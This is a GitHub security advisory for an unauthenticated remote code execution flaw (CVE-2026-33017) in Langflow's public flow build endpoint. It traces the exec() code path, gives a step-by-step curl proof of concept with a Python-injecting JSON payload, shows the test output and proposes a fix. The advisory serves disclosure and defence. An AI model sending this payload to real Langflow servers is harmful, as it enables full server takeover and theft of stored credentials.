# [C] Unauthenticated Remote Code Execution in Langflow via Public Flow Build Endpoint

## Summary
Severity: Critical
Advisory: GHSA-vwmf-pq79-vjvx
CVE: CVE-2026-33017
CWE: CWE-306, CWE-94, CWE-95
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-17
Source: https://github.com/advisories/GHSA-vwmf-pq79-vjvx
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=0 <1.9.0

## Details
## Summary

The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint allows building public flows without requiring authentication. When the optional `data` parameter is supplied, the endpoint uses **attacker-controlled flow data** (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to `exec()` with zero sandboxing, resulting in unauthenticated remote code execution.

This is distinct from CVE-2025-3248, which fixed `/api/v1/validate/code` by adding authentication. The `build_public_tmp` endpoint is **designed** to be unauthenticated (for public flows) but incorrectly accepts attacker-supplied flow data containing arbitrary executable code.

## Affected Code

### Vulnerable Endpoint (No Authentication)

**File:** `src/backend/base/langflow/api/v1/chat.py`, lines 580-657

```python
@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    data: Annotated[FlowDataRequest | None, Body(embed=True)] = None,  # ATTACKER CONTROLLED
    request: Request,
    # ... NO Depends(get_current_active_user) -- MISSING AUTH ...
):
    """Build a public flow without requiring authentication."""
    client_id = request.cookies.get("client_id")
    owner_user, new_flow_id = await verify_public_flow_and_get_user(flow_id=flow_id, client_id=client_id)

    job_id = await start_flow_build(
        flow_id=new_flow_id,
        data=data,  # Attacker's data passed directly to graph builder
        current_user=owner_user,
        ...
    )
```

Compare with the authenticated build endpoint at line 138, which requires `current_user: CurrentActiveUser`.

### Code Execution Chain

When attacker-supplied `data` is provided, it flows through:

1. `start_flow_build(data=attacker_data)` → `generate_flow_events()` -- `build.py:81`
2. `create_graph()` → `build_graph_from_data(payload=data.model_dump())` -- `build.py:298`
3. `Graph.from_payload(payload)` parses attacker nodes -- `base.py:1168`
4. `add_nodes_and_edges()` → `initialize()` → `_build_graph()` -- `base.py:270,527`
5. `_instantiate_components_in_vertices()` iterates nodes -- `base.py:1323`
6. `vertex.instantiate_component()` → `instantiate_class(vertex)` -- `loading.py:28`
7. `code = custom_params.pop("code")` extracts attacker code -- `loading.py:43`
8. `eval_custom_component_code(code)` → `create_class(code, class_name)` -- `eval.py:9`
9. `prepare_global_scope(module)` -- `validate.py:323`
10. `exec(compiled_code, exec_globals)` -- **ARBITRARY CODE EXECUTION** -- `validate.py:397`

### Unsandboxed exec() in prepare_global_scope

**File:** `src/lfx/src/lfx/custom/validate.py`, lines 340-397

```python
def prepare_global_scope(module):
    exec_globals = globals().copy()

    # Imports are resolved first (any module can be imported)
    for node in imports:
        module_obj = importlib.import_module(module_name)  # line 352
        exec_globals[variable_name] = module_obj

    # Then ALL top-level definitions are executed (Assign, ClassDef, FunctionDef)
    if definitions:
        combined_module = ast.Module(body=definitions, type_ignores=[])
        compiled_code = compile(combined_module, "<string>", "exec")
        exec(compiled_code, exec_globals)  # line 397 - ARBITRARY CODE EXECUTION
```

**Critical detail:** `prepare_global_scope` executes `ast.Assign` nodes. An attacker's code like `_x = os.system("id")` is an assignment and will be executed during graph building -- before the flow even "runs."

## Prerequisites

1. Target Langflow instance has at least **one public flow** (common for demos, chatbots, shared workflows)
2. Attacker knows the public flow's UUID (discoverable via shared links/URLs)
3. No authentication required -- only a `client_id` cookie (any arbitrary string value)

When `AUTO_LOGIN=true` (the **default**), all prerequisites can be met by an unauthenticated attacker:
1. `GET /api/v1/auto_login` → obtain superuser token
2. `POST /api/v1/flows/` → create a public flow
3. Exploit via `build_public_tmp` without any auth

## Proof of Concept

### Tested Against

- **Langflow version 1.7.3** (latest stable release, installed via `pip install langflow`)
- **Fully reproducible**: 6/6 runs confirmed RCE (two sets of 3 runs each)

### Step 1: Obtain a Public Flow ID

(In a real attack, the attacker discovers this via shared links. For the PoC, we create one via AUTO_LOGIN.)

```bash
# Get superuser token (no credentials needed when AUTO_LOGIN=true)
TOKEN=$(curl -s http://localhost:7860/api/v1/auto_login | jq -r '.access_token')

# Create a public flow
FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","data":{"nodes":[],"edges":[]},"access_type":"PUBLIC"}' \
  | jq -r '.id')

echo "Public Flow ID: $FLOW_ID"
```

### Step 2: Exploit -- Unauthenticated RCE

```bash
# EXPLOIT: Send malicious flow data to the UNAUTHENTICATED endpoint
# NO Authorization header, NO API key, NO credentials
curl -X POST "http://localhost:7860/api/v1/build_public_tmp/${FLOW_ID}/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=attacker" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os, socket, json as _json\n\n_proof = os.popen(\"id\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    },
    "inputs": null
  }'
```

### Step 3: Verify Code Execution

```bash
# Wait 2 seconds for async graph building
sleep 2

# Check proof file written by attacker's code on the server
cat /tmp/rce-proof
# Output: uid=1000(aviral) gid=1000(aviral) groups=... on kali
```

### Actual Test Results

```
======================================================================
LANGFLOW v1.7.3 UNAUTHENTICATED RCE - DEFINITIVE E2E TEST
======================================================================
Version:  Langflow 1.7.3

RUN 1: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d8db19bf-a532-4f9d-a368-9c46d6235c19
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-f0d19b36
    hostname: kali
    uid: 1000
    whoami: aviral
    id: uid=1000(aviral) gid=1000(aviral) groups=1000(aviral),...
    uname: Linux 6.16.8+kali-amd64

RUN 2: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: d2e24f20-d707-4278-868c-583dd7532832
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-6037a271

RUN 3: POST /api/v1/build_public_tmp/{id}/flow (NO AUTH)
  HTTP 200 - Job ID: 5962244a-42af-4ef6-b134-a6a4adba5ab7
  *** REMOTE CODE EXECUTION CONFIRMED ***
    canary: RCE-4a796556

FINAL RESULTS
  Total checks:   15
  VULNERABLE:     15
  SAFE:           0
  RCE confirmed:  3/3 runs
  Reproducible:   YES (100%)
```

## Impact

- **Unauthenticated Remote Code Execution** with full server process privileges
- **Complete server compromise**: arbitrary file read/write, command execution
- **Environment variable exfiltration**: API keys, database credentials, cloud tokens (confirmed in PoC: env_keys exfiltrated)
- **Reverse shell access** for persistent access
- **Lateral movement** within the network
- **Data exfiltration** from all flows, messages, and stored credentials in the database

## Comparison with CVE-2025-3248

| Aspect | CVE-2025-3248 | This Vulnerability |
|--------|--------------|-------------------|
| **Endpoint** | `/api/v1/validate/code` | `/api/v1/build_public_tmp/{id}/flow` |
| **Fix applied** | Added `Depends(get_current_active_user)` | None -- NEW vulnerability |
| **Root cause** | Missing auth on code validation | Unauthenticated endpoint accepts attacker-controlled executable code via `data` param |
| **Code execution via** | `validate_code()` → `exec()` | `create_class()` → `prepare_global_scope()` → `exec()` |
| **CISA KEV** | Yes (actively exploited) | N/A (new finding) |
| **Can simple auth fix?** | Yes (and it was fixed) | No -- endpoint is *designed* to be unauthenticated; the `data` parameter must be removed |

## Recommended Fix

### Immediate (Short-term)

**Remove the `data` parameter** from `build_public_tmp`. Public flows should only execute their stored flow data, never attacker-supplied data:

```python
@router.post("/build_public_tmp/{flow_id}/flow")
async def build_public_tmp(
    *,
    flow_id: uuid.UUID,
    inputs: Annotated[InputValueRequest | None, Body(embed=True)] = None,
    # REMOVED: data parameter -- public flows must use stored data only
    ...
):
```

In `generate_flow_events` → `create_graph()`, only the `build_graph_from_db` path should be reachable for unauthenticated requests:

```python
async def create_graph(fresh_session, flow_id_str, flow_name):
    # For public flows, ALWAYS load from database, never from user data
    return await build_graph_from_db(
        flow_id=flow_id,
        session=fresh_session,
        ...
    )
```

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33017
- https://github.com/langflow-ai/langflow/issues/12345
- https://github.com/langflow-ai/langflow/pull/12160
- https://github.com/langflow-ai/langflow/commit/73b6612e3ef25fdae0a752d75b0fabd47328d4f0
- https://github.com/advisories/GHSA-rvqx-wpfh-mfx7
- https://github.com/langflow-ai/langflow
- https://github.com/langflow-ai/langflow/releases/tag/1.8.2
- https://medium.com/@aviral23/cve-2026-33017-how-i-found-an-unauthenticated-rce-in-langflow-by-reading-the-code-they-already-dc96cdce5896
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-33017
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33017
- https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours
